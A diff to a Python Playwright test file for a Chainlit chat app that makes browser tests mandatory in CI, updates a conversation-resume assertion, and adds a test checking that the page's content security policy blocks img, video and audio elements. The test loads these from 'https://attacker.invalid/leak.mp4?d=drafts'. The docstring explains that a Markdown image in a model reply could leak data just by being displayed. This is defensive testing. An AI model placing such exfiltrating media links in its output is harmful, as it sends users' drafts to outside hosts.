@@ -38,6 +38,10 @@ from tests.browser.serve import (
     TEST_USERS,
 )
 
+# In CI the tests must run: a missing playwright fails instead of skipping the job green.
+if os.getenv("MACKIE_BROWSER_REQUIRED"):
+    import playwright.sync_api as _sync_api  # noqa: F401
+
 playwright = pytest.importorskip("playwright.sync_api")
 pytestmark = pytest.mark.browser
 
@@ -264,7 +268,7 @@ def test_a_conversation_resumes_after_a_reload_until_a_new_one_is_started(
     _onboard(page, "Resume Org")
     _wait_for_text(page, "We were in the middle of a conversation")
     body = page.inner_text("body")
-    assert "Welcome back!" in body and "1 post for" in body
+    assert "Welcome back!" in body and "I remember 0 brand preferences and 1 post." in body
     assert body.index("save Gala recap") < body.index("Saved it to the ledger.")
     _send(page, "what was it?")
     _wait_for_text(page, "You said: what was it?. Messages I can see: 2.")  # the model sees both
@@ -274,3 +278,24 @@ def test_a_conversation_resumes_after_a_reload_until_a_new_one_is_started(
     _send(page, "fresh start")
     _wait_for_text(page, "You said: fresh start. Messages I can see: 1.")
     assert page.console_errors == []
+
+
+@pytest.mark.parametrize("tag", ["img", "video", "audio"])
+def test_the_page_loads_media_only_from_mackie(server, new_page, tag):
+    """
+    A reply's Markdown image to another site would send data out just by being shown;
+    Chainlit shows one ending in .mp4 as a video, which the image rule alone let through.
+    """
+    url, _ = server
+    page = new_page(DESKTOP)
+    page.goto(url)
+    blocked = page.evaluate(
+        """tag => new Promise(resolve => {
+            document.addEventListener("securitypolicyviolation", e => resolve(e.blockedURI));
+            const element = document.createElement(tag);
+            element.src = "https://attacker.invalid/leak.mp4?d=drafts";
+            document.body.appendChild(element);
+        })""",
+        tag,
+    )
+    assert blocked.startswith("https://attacker.invalid/")
